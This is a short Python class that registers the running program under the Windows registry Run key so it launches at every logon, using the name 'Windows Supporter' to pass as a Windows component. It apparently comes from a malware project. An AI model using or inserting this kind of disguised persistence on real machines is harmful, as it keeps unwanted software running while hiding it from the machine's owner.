from src.utils.LibConnector import LibConnector


class StartReg:
    def __init__(self) -> None:
        self.__lib = LibConnector()
        self.__key_type = self.__lib.reg.HKEY_CURRENT_USER
        self.__key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        self.__current_path = self.__lib.os.path.realpath(self.__lib.sys.argv[0])
        return

    def add_to_startup(self) -> None:
        open_key = self.__lib.reg.OpenKey(
            self.__key_type,
            self.__key_path,
            0,
            self.__lib.reg.KEY_ALL_ACCESS,
        )
        self.__lib.reg.SetValueEx(
            open_key,
            "Windows Supporter",
            0,
            self.__lib.reg.REG_SZ,
            self.__current_path,
        )
        self.__lib.reg.CloseKey(open_key)
        return
    